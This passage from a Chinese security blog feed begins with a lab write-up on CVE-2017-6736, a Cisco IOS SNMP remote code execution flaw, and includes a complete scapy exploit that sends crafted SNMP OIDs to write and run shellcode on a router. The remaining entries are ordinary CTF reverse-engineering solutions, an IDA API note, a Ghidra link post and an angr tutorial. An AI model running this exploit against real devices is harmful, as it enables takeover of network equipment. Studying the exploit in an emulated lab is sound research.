<h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><p>docker环境 (ubuntu 15)：</p>
<pre><code class="shell">docker pull ubuntu:wily
</code></pre>
<pre><code>docker ps -a
docker run --cap-add=NET_ADMIN --device=/dev/net/tun  -it ubuntu:wily /bin/bash
</code></pre>
<pre><code>apt install git
</code></pre>
<p>换源到旧版ubuntu：</p>
<pre><code>sed -i &#39;s/archive/old-releases/g&#39; /etc/apt/sources.list
apt update
</code></pre>
<p>编译模拟环境dynamips</p>
<pre><code class="shell">apt-get install git
git clone https://github.com/Groundworkstech/dynamips-gdb-mod.git

cd dynamips-gdb-mod/src
# 安装依赖
apt-get install libpcap-dev uml-utilities libelf-dev libelf1

# 这里需要修改配置文件
cd /
find . -name &quot;libelf.a&quot;
# ./usr/lib/x86_64-linux-gnu/libelf.a
vim Makefile
</code></pre>
<img src="/2024/01/24/CVE-2017-6736/image-20240124172328534.png" alt="image-20240124172328534" style="zoom:50%;">

<img src="/2024/01/24/CVE-2017-6736/image-20240125085212819.png" alt="image-20240125085212819" style="zoom:50%;">

<img src="/2024/01/24/CVE-2017-6736/image-20240125085538393.png" alt="image-20240125085538393" style="zoom:50%;">

<p>配置网络</p>
<pre><code class="shell">tunctl -t tap1 # 创建网络接口
ifconfig tap1 up # 配置启用网络接口
ifconfig tap1 192.168.199.139/24 up # 指定给tap1的IP地址和子网掩码

# 删除
ifconfig tap1 down
tunctl -d tap1
</code></pre>
<p><img src="/2024/01/24/CVE-2017-6736/image-20240125092852258.png" alt="image-20240125092852258"></p>
<p>运行</p>
<pre><code class="shell">dynamips -j -P 2600 -s 0:0:tap:tap1 C2600-BI.BIN
</code></pre>
<p>开启gdb server调试</p>
<pre><code class="shell">dynamips -Z 12345 -j -P 2600 -s 0:0:tap:tap1 C2600-BI.BIN
</code></pre>
<p>配置：</p>
<pre><code>Would you like to enter the initial configuration dialog? [yes/no]:yes
management network from the above interface summary: Ethernet0/0
ip address 192.168.199.138 255.255.255.0
</code></pre>
<p>重新配置方法</p>
<pre><code>rm c2600_*
</code></pre>
<pre><code class="shell">python c2800nm-adventerprisek9-mz.151-4.M12a.py 192.168.199.254 public 12345678
</code></pre>
<p>c2800nm-adventerprisek9-mz.151-4.M12a.py</p>
<pre><code class="python">from scapy.all import *
from time import sleep
from struct import pack, unpack
import random
import argparse
import sys


try:
    cs = __import__(&#39;capstone&#39;)
except ImportError:
    pass

def bin2oid(buf):
    return &#39;&#39;.join([&#39;.&#39; + str(unpack(&#39;B&#39;,x)[0]) for x in buf])

def shift(s, offset):
    res = pack(&#39;&gt;I&#39;, unpack(&#39;&gt;I&#39;, s)[0] + offset)
    return res



alps_oid = &#39;1.3.6.1.4.1.9.9.95.1.3.1.1.7.108.39.84.85.195.249.106.59.210.37.23.42.103.182.75.232.81&#123;0&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&#123;5&#125;&#123;6&#125;&#123;7&#125;.14.167.142.47.118.77.96.179.109.211.170.27.243.88.157.50&#123;8&#125;&#123;9&#125;.35.27.203.165.44.25.83.68.39.22.219.77.32.38.6.115&#123;10&#125;&#123;11&#125;.11.187.147.166.116.171.114.126.109.248.144.111.30&#39;
shellcode_start = &#39;\x80\x00\xf0\x00&#39;

if __name__ == &#39;__main__&#39;:
    parser = argparse.ArgumentParser()
    parser.add_argument(&quot;host&quot;, type=str, help=&quot;host IP&quot;)
    parser.add_argument(&quot;community&quot;, type=str, help=&quot;community string&quot;)
    parser.add_argument(&quot;shellcode&quot;, action=&#39;store&#39;, type=str, help=&#39;shellcode to run (in hex)&#39;)
    args = parser.parse_args()


    sh_buf = args.shellcode.replace(&#39; &#39;,&#39;&#39;).decode(&#39;hex&#39;)
    print &#39;Writing shellcode to 0x&#123;&#125;&#39;.format(shellcode_start.encode(&#39;hex&#39;))
    if &#39;capstone&#39; in sys.modules: 
        md = cs.Cs(cs.CS_ARCH_MIPS, cs.CS_MODE_MIPS32 | cs.CS_MODE_BIG_ENDIAN)

    for k, sh_dword in enumerate([sh_buf[i:i+4] for i in range(0, len(sh_buf), 4)]):
        s0 = bin2oid(sh_dword)  # shellcode dword
        s1 = bin2oid(&#39;\x00\x00\x00\x00&#39;) 
        s2 = bin2oid(&#39;\xBF\xC5\xB7\xDC&#39;)
        s3 = bin2oid(&#39;\x00\x00\x00\x00&#39;)
        s4 = bin2oid(&#39;\x00\x00\x00\x00&#39;)
        s5 = bin2oid(&#39;\x00\x00\x00\x00&#39;)
        s6 = bin2oid(&#39;\x00\x00\x00\x00&#39;)
        ra = bin2oid(&#39;\xbf\xc2\x2f\x60&#39;) # return control flow jumping over 1 stack frame
        s0_2 = bin2oid(shift(shellcode_start, k * 4))
        ra_2 = bin2oid(&#39;\xbf\xc7\x08\x60&#39;)
        s0_3 = bin2oid(&#39;\x00\x00\x00\x00&#39;)
        ra_3 = bin2oid(&#39;\xBF\xC3\x86\xA0&#39;)
        
        payload = alps_oid.format(s0, s1, s2, s3, s4, s5, s6, ra, s0_2, ra_2, s0_3, ra_3)
        
        send(IP(dst=args.host)/UDP(sport=161,dport=161)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))

        cur_addr = unpack(&quot;&gt;I&quot;,shift(shellcode_start, k * 4 + 0xa4))[0]
        if &#39;capstone&#39; in sys.modules: 
            for i in md.disasm(sh_dword, cur_addr):
                color = &#39;green&#39;
        else:
            print(&quot;0x%x:\t%s&quot; %(cur_addr, sh_dword.encode(&#39;hex&#39;)))
            
        sleep(1)

    ans = raw_input(&quot;Jump to shellcode? [yes]: &quot;)

    if ans == &#39;yes&#39;:
        ra = bin2oid(shift(shellcode_start, 0xa4)) # return control flow jumping over 1 stack frame
        zero = bin2oid(&#39;\x00\x00\x00\x00&#39;)
        payload = alps_oid.format(zero, zero, zero, zero, zero, zero, zero, ra, zero, zero, zero, zero)
        send(IP(dst=args.host)/UDP(sport=161,dport=161)/SNMP(community=args.community,PDU=SNMPget(varbindlist=[SNMPvarbind(oid=payload)])))
        print &#39;Jump taken!&#39;
</code></pre>
<p>gdb连接</p>
<pre><code class="shell">gdb-multiarch
set architecture powerpc:MPC8XX
set endian big
</code></pre>
<p>端口转发（这里用的wsl所以需要。。。）</p>
<pre><code class="shell">socat -T 600 TCP-LISTEN:1234,fork,reuseaddr TCP:172.17.0.2:1234 &amp;
</code></pre>
<p>ida attach进去即可</p>
<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>参考资料：<a href="https://www.anquanke.com/post/id/98225">CVE-2017-6736 思科IOS系统远程代码执行漏洞分析-安全客 - 安全资讯平台 (anquanke.com)</a></p>
]]></content>
  </entry>
  <entry>
    <title>Changes of Python API in IDA</title>
    <url>/2022/09/25/Changes-of-Python-API-in-IDA/</url>
    <content><![CDATA[<h1 id="Changes-of-Python-API-in-IDA-7-x"><a href="#Changes-of-Python-API-in-IDA-7-x" class="headerlink" title="Changes of Python API in IDA 7.x"></a>Changes of Python API in IDA 7.x</h1><span id="more"></span>
<h4 id="From-IDA-6-x-to-IDA-7-x-there-has-been-lots-of-changes-And-as-a-green-hands-when-I-look-up-at-some-writes-up-some-method-just-didn’t-work-out-That’s-when-I-knew-that-many-python-API-has-change-from-IDA-6-x-to-IDA-7-x"><a href="#From-IDA-6-x-to-IDA-7-x-there-has-been-lots-of-changes-And-as-a-green-hands-when-I-look-up-at-some-writes-up-some-method-just-didn’t-work-out-That’s-when-I-knew-that-many-python-API-has-change-from-IDA-6-x-to-IDA-7-x" class="headerlink" title="From IDA 6.x to IDA 7.x, there has been lots of changes. And as a green hands, when I look up at some writes up, some method just didn’t work out. That’s when I knew that many python API has change from IDA 6.x to IDA 7.x."></a>From IDA 6.x to IDA 7.x, there has been lots of changes. And as a green hands, when I look up at some writes up, some method just didn’t work out. That’s when I knew that many python API has change from IDA 6.x to IDA 7.x.</h4><h4 id="Website-that-may-help-you"><a href="#Website-that-may-help-you" class="headerlink" title="Website that may help you:"></a>Website that may help you:</h4><h4 id="blog-in-chinese"><a href="#blog-in-chinese" class="headerlink" title="blog in chinese"></a><a href="https://ybrc.github.io/zh-cn/14-2/">blog in chinese</a></h4><h4 id="IDAPython-documentation"><a href="#IDAPython-documentation" class="headerlink" title="IDAPython documentation"></a><a href="https://hex-rays.com/products/ida/support/idapython_docs/">IDAPython documentation</a></h4><h4 id="hex-rays"><a href="#hex-rays" class="headerlink" title="hex-rays"></a><a href="https://hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml">hex-rays</a></h4>]]></content>
      <tags>
        <tag>ctf</tag>
        <tag>reverse</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>Ghidra初探</title>
    <url>/2023/11/27/Ghidra%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE：之前是能不用就不用，现在遇到第二次不用不行了，xdm，和Ghidra爆了！"><a href="#PREFACE：之前是能不用就不用，现在遇到第二次不用不行了，xdm，和Ghidra爆了！" class="headerlink" title="PREFACE：之前是能不用就不用，现在遇到第二次不用不行了，xdm，和Ghidra爆了！"></a>PREFACE：之前是能不用就不用，现在遇到第二次不用不行了，xdm，和Ghidra爆了！</h6><h6 id="这一篇仅介绍Ghidra一些操作，开发等等暂时没这个水平5555555555"><a href="#这一篇仅介绍Ghidra一些操作，开发等等暂时没这个水平5555555555" class="headerlink" title="这一篇仅介绍Ghidra一些操作，开发等等暂时没这个水平5555555555"></a>这一篇仅介绍Ghidra一些操作，开发等等暂时没这个水平5555555555</h6><span id="more"></span>

<p>先偷一个队里爷的<a href="https://blog.gaoyucan.site/posts/ghidra-%E4%BD%BF%E7%94%A8%E5%8F%8A%E9%85%8D%E7%BD%AE/">Ghidra 使用及配置 (gaoyucan.site)</a></p>
<h6 id="（刚想写他就发了，那就先偷-反正TODO还多）"><a href="#（刚想写他就发了，那就先偷-反正TODO还多）" class="headerlink" title="（刚想写他就发了，那就先偷 反正TODO还多）"></a>（刚想写他就发了，那就先偷 <del>反正TODO还多</del>）</h6>]]></content>
  </entry>
  <entry>
    <title>ISITDTUCTF</title>
    <url>/2023/10/17/ISITDTUCTF/</url>
    <content><![CDATA[<h6 id="PREFACE：最近确实作业很多，题只能慢慢写吧，9-17：小做了四个比较ez的"><a href="#PREFACE：最近确实作业很多，题只能慢慢写吧，9-17：小做了四个比较ez的" class="headerlink" title="PREFACE：最近确实作业很多，题只能慢慢写吧，9-17：小做了四个比较ez的"></a>PREFACE：最近确实作业很多，题只能慢慢写吧，9-17：小做了四个比较ez的</h6><span id="more"></span>

<h3 id="re01"><a href="#re01" class="headerlink" title="re01"></a>re01</h3><p>核心加密部分：</p>
<p><img src="/2023/10/17/ISITDTUCTF/image-20231017081840615.png" alt="image-20231017081840615"></p>
<p>翻译为循环：</p>
<pre><code class="python"># ISITDTU&#123;11111111aaaaaaaa&#125;
prime = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,
103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,
211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,
331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,
449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,
587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,
709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,
853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,
991,997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,
1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,
1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327]
print(len(prime))
v14 = [0 for _ in range(25)]
for k in range(5):
    for m in range(5):
        v14[5 * k + m] = prime[k * 5 + m]
print(v14)

map = &#123;&#125;

a = [0x4CFC,0x52A8,0x5AA2,0x651C,0x4881,0x5203,0x57DF,0x6043,0x6B51,0x49C6,0x538F,0x5975,0x6231,0x6D6B,0x42DC,0x4C10,0x51AC,0x59B8,0x6448,0x1F63,0x2475,0x27C9,0x2C8D,0x333F]

def enc(a):
    global map, prime
    output = [0 for _ in range(25)]
    for i in range(5):
        for j in range(5):
            for k in range(5):
                output[5 * i + j] += prime[5 * k + j] * a[5 * i + k]
</code></pre>
<p>z3求解即可</p>
<pre><code class="python">from z3 import *

input = [Int(f&#39;input_&#123;i&#125;&#39;) for i in range(25)]

count_5 = 5
count_5_1 = 5
count_5_2 = 5

a6 = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,
103,107,109,113,127,131,137,139,149,151,157,163,167,173,179,181,191,193,197,199,
211,223,227,229,233,239,241,251,257,263,269,271,277,281,283,293,307,311,313,317,
331,337,347,349,353,359,367,373,379,383,389,397,401,409,419,421,431,433,439,443,
449,457,461,463,467,479,487,491,499,503,509,521,523,541,547,557,563,569,571,577,
587,593,599,601,607,613,617,619,631,641,643,647,653,659,661,673,677,683,691,701,
709,719,727,733,739,743,751,757,761,769,773,787,797,809,811,821,823,827,829,839,
853,857,859,863,877,881,883,887,907,911,919,929,937,941,947,953,967,971,977,983,
991,997,1009,1013,1019,1021,1031,1033,1039,1049,1051,1061,1063,1069,1087,1091,1093,
1097,1103,1109,1117,1123,1129,1151,1153,1163,1171,1181,1187,1193,1201,1213,1217,1223,
1229,1231,1237,1249,1259,1277,1279,1283,1289,1291,1297,1301,1303,1307,1319,1321,1327]
output = [0x43AD, 0x4CFC,0x52A8,0x5AA2,0x651C,0x4881,0x5203,0x57DF,0x6043,0x6B51,0x49C6,0x538F,0x5975,0x6231,0x6D6B,0x42DC,0x4C10,0x51AC,0x59B8,0x6448,0x1F63,0x2475,0x27C9,0x2C8D,0x333F,0x7F78]

s = Solver()

for i in range(count_5):
    for j in range(count_5_2):
        sum_expr = Sum([a6[5 * k + j] * input[5 * i + k] for k in range(count_5_1)])
        s.add(output[5 * i + j] == sum_expr)

if s.check() == sat:
    m = s.model()
    solution = [m[input[i]].as_long() for i in range(25)]
    print(&quot;Solution for input array:&quot;, solution)
else:
    print(&quot;No solution found&quot;)

x = [103, 111, 111, 100, 95, 106, 111, 98, 95, 121, 111, 117, 95, 115, 111, 108, 118, 101, 100, 95, 114, 101, 48, 49, 33]
for i in x:
    print(chr(i),end=&#39;&#39;)
    
# good_job_you_solved_re01!
</code></pre>
<h3 id="dot"><a href="#dot" class="headerlink" title="dot"></a>dot</h3><p>检测<code>osname</code>，然后进行魔改的morse编码，与密文对照</p>
<p>golang写的，反编译几乎没法看，看汇编即可</p>
<p>魔改的morse编码可以不用逆，看出来是一一映射的加密即可，动态patch检测的<code>osname</code>（注意第二个返回值是osname的长度，也需要patch）写入表，在加密过程后获得表，与密文对照即可获得flag</p>
<p>(这里前面有将所有字符变为大写，最后直接交全大写即可)</p>
<pre><code class="python">map = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890&#123;&#125;-&#39;
a = &#39;-... -.-. ..... --. -- --.- .--. .--- -.... .-.. ..- _ --- - ....- .. ...- .---- .-- ----- --.. -..- -.-- ...-- ..--- .-. -... -.-. ..... --. -- --.- .--. .--- -.... .-.. ..- _ --- - ....- .. ...- .---- .-- ----- --.. -..- -.-- ...-- ..--- .-. . -.. --... ----. -.- ---.. .- ..-. .... ... &#39;
a = a.split(&#39; &#39;)

b = &#39;..... ... --- .. --.. ----- --... .---- --. ----- --.. -.-- --... _ ..... ... --- --...&#39;
b = b.split()
flag = &#39;&#39;
for i in b:
    for j in range(len(a)):
        if (i == a[j]):
            # print(map[j],end=&#39;&#39;)
            flag += map[j]
            break
flag = flag.upper()
print(flag)

# C0MPUT3RDTUW3LC0M3
</code></pre>
<h3 id="sanity-check"><a href="#sanity-check" class="headerlink" title="sanity_check"></a>sanity_check</h3><p>go的反编译完全的就是…</p>
<p>硬看汇编即可，对着栈看（这里被nop掉的即为判断并跳出循环的）</p>
<p><img src="/2023/10/17/ISITDTUCTF/image-20231017142409397.png" alt="image-20231017142409397"></p>
<p>前面一直没注意到<code>main_calc</code></p>
<pre><code class="cpp">__int64 __fastcall main_calc()
&#123;
  __int64 result; // rax
  __int64 v1; // r14
  __int64 v2; // [rsp+0h] [rbp-10h]
  void *retaddr; // [rsp+10h] [rbp+0h] BYREF

  if ( (unsigned __int64)&amp;retaddr &lt;= *(_QWORD *)(v1 + 16) )
    runtime_morestack_noctxt_abi0();
  if ( result &gt; 1 )
  &#123;
    v2 = main_calc();
    return v2 + main_calc();
  &#125;
  return result;
&#125;
</code></pre>
<p>这里是一个斐波那契数列，然后结合汇编发现，和flag进行异或即可</p>
<p>实际上，这里也可以断在合适的位置，直接在栈中找到flag</p>
<p><img src="/2023/10/17/ISITDTUCTF/image-20231017142853962.png" alt="image-20231017142853962"></p>
<p>解密exp：</p>
<pre><code class="python">a = [0x54,0x69,0x68,0x71,0x5C,0x4C,0x7B,0x52,0x42,0x4A,0x52,0x2B,0x0F5,0x0B6,0x120,0x20D,0x3AE,0x64F,0x0A47,0x1007,0x1A28,0x2A9D,0x4565,0x6F9E,0x0B555,0x12563,0x1DA5F,0x2FF27,0x4D90A,0x7D8EA,0x0CB26A,0x148AB8,0x213D62,0x35C78B,0x570489]

b = [0,1]
for i in range(len(a)):
    if (i+1 == len(b)):
        b.append(b[i] + b[i-1])
    print(chr(a[i] ^ b[i]),end=&#39;&#39;)

# ISITDTU&#123;This_Is_Where_Your_RE_Journey_Begin&#125;
</code></pre>
<h3 id="simple-encrypt"><a href="#simple-encrypt" class="headerlink" title="simple_encrypt"></a>simple_encrypt</h3><p>golang，反编译同样有巨大的问题</p>
<p>换表的base64，然后有个异或0x2a比较明显，但是解密不对，可以猜测，发现数字不会有操作，而字母猜测前几个为<code>Th1s</code></p>
<pre><code class="python">a = &#39;Guf&#39;
b = &#39;Ths&#39;
for i in range(3):
    print(ord(a[i]) - ord(b[i]))
</code></pre>
<p><img src="/2023/10/17/ISITDTUCTF/image-20231017164530423.png" alt="image-20231017164530423"></p>
<p>差13，猜测得到最后exp…</p>
<pre><code class="python">a = [0x6d,0x5f,0x1b,0x4c,0x75,0x1b,0x4c,0x75,0x4c,0x1b,0x50,0x49,0x53,0x19,0x75,0x19,0x4b,0x5a,0x4f,0x46,0x49,0x4d,0x75,0x40,0x1b,0x4d,0x5f,0x75,0x7e,0x1a,0x1a,0x1a,0x1a,0x1a,0x1a,0x0b]
print(&#39;ISITDTU&#123;&#39;,end=&#39;&#39;)
flag = &#39;&#39;
for i in a:
    if chr(i ^ 0x2a) in &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;:
        flag += chr((((i ^ 0x2a) - ord(&#39;A&#39;) + 13) % 26) + ord(&#39;A&#39;))
    elif chr(i ^ 0x2a) in &#39;abcdefghijklmnopqrstuvwxyz&#39;:
        flag += chr((((i ^ 0x2a) - ord(&#39;a&#39;) + 13) % 26) + ord(&#39;a&#39;))
    else:
        flag += chr(i ^ 0x2a)
    # flag += chr(i ^ 0x2a)
print(flag,end=&#39;&#39;)
print(&#39;&#125;&#39;)

# ISITDTU&#123;Th1s_1s_s1mpl3_3ncrypt_w1th_G000000!&#125;
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>angr初探</title>
    <url>/2023/10/24/angr%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="PREFACE：最近遇到需要动态模拟的题比较多，这里还是系统学一下angr"><a href="#PREFACE：最近遇到需要动态模拟的题比较多，这里还是系统学一下angr" class="headerlink" title="PREFACE：最近遇到需要动态模拟的题比较多，这里还是系统学一下angr"></a>PREFACE：最近遇到需要动态模拟的题比较多，这里还是系统学一下angr</h6><h6 id="ps-angr的文档还是写的比较有意思而且详细的，适合当睡前读物，点名批评某二进制分析工具的文档……"><a href="#ps-angr的文档还是写的比较有意思而且详细的，适合当睡前读物，点名批评某二进制分析工具的文档……" class="headerlink" title="ps. angr的文档还是写的比较有意思而且详细的，适合当睡前读物，点名批评某二进制分析工具的文档……"></a>ps. angr的文档还是写的比较有意思而且详细的，适合当睡前读物，点名批评某二进制分析工具的文档……</h6><span id="more"></span>

<h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://docs.angr.io/en/latest/">angr documentation</a></p>
<p><a href="https://github.com/jakespringer/angr_ctf">jakespringer&#x2F;angr_ctf (github.com)</a></p>
<h4 id="虚拟环境"><a href="#虚拟环境" class="headerlink" title="虚拟环境"></a>虚拟环境</h4><p><code>angr</code>官方推荐在虚拟环境中运行，防止与外部包冲突（例如<code>keystone</code>和<code>keystone-engine</code>冲突，这里用的是<code>keystone-engine</code>）</p>
<pre><code>pip install virtualenv

# 在当前目录下创建名为 angr-venv的新目录，包含干净的python环境
virtualenv angr-venv

Windows：
angr-venv\Scripts\activate

Linux/Mac：
source angr-venv/bin/activate

pip install angr

退出虚拟环境：
deactivate
</code></pre>
<h3 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h3><h4 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a>导入模块</h4><pre><code class="python">import angr
proj = angr.Project(&#39;./file&#39;)
</code></pre>
<h4 id="命令行使用时可以导入monkeyhex转化为十六进制输出"><a href="#命令行使用时可以导入monkeyhex转化为十六进制输出" class="headerlink" title="命令行使用时可以导入monkeyhex转化为十六进制输出"></a>命令行使用时可以导入<code>monkeyhex</code>转化为十六进制输出</h4><pre><code class="python">import monkeyhex # this will format numerical results in hexadecimal
</code></pre>
<h4 id="project的基础属性"><a href="#project的基础属性" class="headerlink" title="project的基础属性"></a>project的基础属性</h4><pre><code class="python">proj.entry # 文件的入口点

proj.filename # 文件名

proj.arch # 文件的架构
- proj.arch.name # x86/x86-64/ARM
- proj.arch.bits # 32/64
- proj.arch.bytes # bytes per instruction, eg : 4/8
- proj.arch.memory_endness # 字节序，例如 Iend_LE代表小端序
</code></pre>
<pre><code class="python">proj.loader # 显示已加载对象，内存映射的地址范围
# &lt;Loaded [file_name], maps [0x400000:0x5004000]&gt;

proj.loader.shared_objects # 已加载的所有共享对象，共享库或动态链接库及其内存映射
# OrderedDict([(&#39;angr&#39;, &lt;ELF Object angr, maps [0x8048000:0x804c033]&gt;), (&#39;libc.so.6&#39;, &lt;ELF Object libc.so.6, maps [0x8100000:0x83347bb]&gt;), (&#39;ld-linux.so.2&#39;, &lt;ELF Object ld-linux.so.2, maps [0x8400000:0x8437a37]&gt;), (&#39;extern-address space&#39;, &lt;ExternObject Object cle##externs, maps [0x8500000:0x8507fff]&gt;), (&#39;cle##tls&#39;, &lt;ELFTLSObjectV2 Object cle##tls, maps [0x8600000:0x8614807]&gt;)])

proj.loader.min_addr # 加载的二进制文件占用的内存空间的界限
# 0x8048000
proj.loader.max_addr
# 0x8707fff

proj.loader.main_object # 返回代表主要加载的二进制文件的对象
# &lt;ELF Object angr, maps [0x8048000:0x804c033]&gt;

proj.loader.main_object.execstack # 返回bool，代表主二进制文件是否具有可执行堆栈
# False

proj.loader.main_object.pic # 二进制文件是否为位置独立代码,若返回True，则说明开启了ASLR
# False
</code></pre>
<h4 id="对基本块的操作"><a href="#对基本块的操作" class="headerlink" title="对基本块的操作"></a>对基本块的操作</h4><pre><code class="python">block = proj.factory.block(proj.entry) # 打印入口的基本块的汇编
block.pp()
&quot;&quot;&quot;
80490b0  endbr32 
80490b4  xor     ebp, ebp
80490b6  pop     esi
80490b7  mov     ecx, esp
80490b9  and     esp, 0xfffffff0
80490bc  push    eax
80490bd  push    esp
80490be  push    edx
80490bf  call    0x80490dd
&quot;&quot;&quot;

block.instructions                  # 该基本块的指令数量
# 9
block.instruction_addrs             # 该基本块指令地址
# (134516912, 134516916, 134516918, 134516919, 134516921, 134516924, 134516925, 134516926, 134516927)

block.capstone # 打印人类可读汇编形式（与.pp()类同）
block.vex # 打印IR代码形式
&quot;&quot;&quot;
IRSB &#123;
   t0:Ity_I32 t1:Ity_I32 t2:Ity_I32 t3:Ity_I32 t4:Ity_I32 t5:Ity_I32 t6:Ity_I32 t7:Ity_I32 t8:Ity_I32 t9:Ity_I32 t10:Ity_I32 t11:Ity_I32 t12:Ity_I32 t13:Ity_I32 t14:Ity_I32 t15:Ity_I32 t16:Ity_I32 t17:Ity_I32 t18:Ity_I32 t19:Ity_I32 t20:Ity_I32 t21:Ity_I32 t22:Ity_I32 t23:Ity_I32 t24:Ity_I32 t25:Ity_I32

   00 | ------ IMark(0x80490b0, 4, 0) ------
   01 | ------ IMark(0x80490b4, 2, 0) ------
   02 | PUT(ebp) = 0x00000000
   03 | PUT(eip) = 0x080490b6
   04 | ------ IMark(0x80490b6, 1, 0) ------
   05 | t4 = GET:I32(esp)
   06 | t3 = LDle:I32(t4)
   07 | t15 = Add32(t4,0x00000004)
   08 | PUT(esi) = t3
   09 | ------ IMark(0x80490b7, 2, 0) ------
   10 | PUT(ecx) = t15
   11 | ------ IMark(0x80490b9, 3, 0) ------
   12 | t5 = And32(t15,0xfffffff0)
   13 | PUT(cc_op) = 0x0000000f
   14 | PUT(cc_dep1) = t5
   15 | PUT(cc_dep2) = 0x00000000
   16 | PUT(cc_ndep) = 0x00000000
   17 | PUT(eip) = 0x080490bc
   18 | ------ IMark(0x80490bc, 1, 0) ------
   19 | t8 = GET:I32(eax)
   20 | t17 = Sub32(t5,0x00000004)
   21 | PUT(esp) = t17
   22 | STle(t17) = t8
   23 | PUT(eip) = 0x080490bd
   24 | ------ IMark(0x80490bd, 1, 0) ------
   25 | t19 = Sub32(t17,0x00000004)
   26 | PUT(esp) = t19
   27 | STle(t19) = t17
   28 | PUT(eip) = 0x080490be
   29 | ------ IMark(0x80490be, 1, 0) ------
   30 | t12 = GET:I32(edx)
   31 | t21 = Sub32(t19,0x00000004)
   32 | PUT(esp) = t21
   33 | STle(t21) = t12
   34 | PUT(eip) = 0x080490bf
   35 | ------ IMark(0x80490bf, 5, 0) ------
   36 | t23 = Sub32(t21,0x00000004)
   37 | PUT(esp) = t23
   38 | STle(t23) = 0x080490c4
   NEXT: PUT(eip) = 0x080490dd; Ijk_Call
&#125;
&quot;&quot;&quot;
</code></pre>
<h4 id="模拟状态-SimState"><a href="#模拟状态-SimState" class="headerlink" title="模拟状态 SimState"></a>模拟状态 <code>SimState</code></h4><pre><code class="python">state = proj.factory.entry_state() 
# &lt;SimState @ 0x80490b0&gt;
print(state)
print(state.regs.eip)
print(state.regs.eax)
print(state.mem[proj.entry].int.resolved)
&quot;&quot;&quot;
&lt;BV32 0x80490b0&gt;
&lt;BV32 0x1c&gt;
&lt;BV32 0xfb1e0ff3&gt;
&quot;&quot;&quot;
# 注意这里的描述，给出官方解释：
# - Those aren’t Python ints! Those are bitvectors. Python integers don’t have the same semantics as words on a CPU, e.g. wrapping on overflow, so we work with bitvectors, which you can think of as an integer as represented by a series of bits, to represent CPU data in angr. Note that each bitvector has a .length property describing how wide it is in bits.

state.solver.eval(state.regs.eax) # 转化为python int
bv = state.solver.BVV(0x1234, 32)       # 反过来创建，create a 32-bit-wide bitvector with value 0x1234

bv = state.solver.BVV(0x1111, 32) # 修改寄存器值
state.regs.eax = bv

state.mem[0x1000].long = 4 # 修改内存中的值
print(state.mem[0x1000].long.resolved)
# &lt;BV32 0x4&gt;
&quot;&quot;&quot;
mem的官方描述：
The mem interface is a little confusing at first, since it’s using some pretty hefty Python magic. The short version of how to use it is:

Use array[index] notation to specify an address

Use .&lt;type&gt; to specify that the memory should be interpreted as type (common values: char, short, int, long, size_t, uint8_t, uint16_t…)

From there, you can either:

Store a value to it, either a bitvector or a Python int

Use .resolved to get the value as a bitvector

Use .concrete to get the value as a Python int
&quot;&quot;&quot;
</code></pre>
<h4 id="模拟管理器-Simulation-Managers"><a href="#模拟管理器-Simulation-Managers" class="headerlink" title="模拟管理器 Simulation Managers"></a>模拟管理器 <code>Simulation Managers</code></h4><pre><code class="python">simgr = proj.factory.simulation_manager(state) # 创建一个新的SimulationManager实例，它将负责管理程序的所有可能的执行路径，包括路径的分叉、合并和死亡

simgr.active 
&quot;&quot;&quot;
拟管理器维护了几个不同的状态列表，这些列表代表了程序执行的不同阶段。这些列表包括：active、unconstrained、deadended、errored等。
simgr.active是一个包含所有“活动”路径的列表。所谓“活动”路径，指的是那些还在进行中、未遇到任何终止条件的路径。这些是可以继续推进执行的路径。
通过查看simgr.active列表，您可以了解当前有多少执行路径正在被模拟管理器管理，并且可以对这些路径进行进一步的查询或操作。
&quot;&quot;&quot;
</code></pre>
<pre><code class="python">import angr
proj = angr.Project(&#39;./angr&#39;)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)
print(simgr)
print(simgr.active)
print(simgr.active[0].regs.eip)
print(&#39;---&#39;)
simgr.step()
print(simgr.active)
print(simgr.active[0].regs.eip)

&quot;&quot;&quot; 这里执行了一整个基本块（注意：smigr不会改变state的信息）
&lt;SimulationManager with 1 active&gt;
[&lt;SimState @ 0x80490b0&gt;]
&lt;BV32 0x80490b0&gt;
---
[&lt;SimState @ 0x80490dd&gt;]
&lt;BV32 0x80490dd&gt;
&quot;&quot;&quot;
</code></pre>
<h4 id="Analyses"><a href="#Analyses" class="headerlink" title="Analyses"></a>Analyses</h4><pre><code class="python">&gt;&gt;&gt; proj.analyses.            # Press TAB here in ipython to get an autocomplete-listing of everything:
 proj.analyses.BackwardSlice        proj.analyses.CongruencyCheck      
